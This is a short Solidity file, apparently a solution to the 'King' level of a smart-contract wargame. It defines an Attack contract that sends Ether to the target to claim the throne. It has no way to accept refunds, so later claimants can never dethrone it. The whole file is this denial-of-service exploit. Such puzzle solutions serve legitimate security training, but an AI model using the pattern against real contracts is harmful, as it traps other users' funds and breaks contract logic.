// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {
    function king() external returns(address);
    function prize() external  returns (uint);
    function owner() external returns (address);
}

contract Attack{
    King public target;
    constructor(address _target){
        target=King(payable(_target));
    }

    function attack() public payable{
        (bool sent, ) = payable(address(target)).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}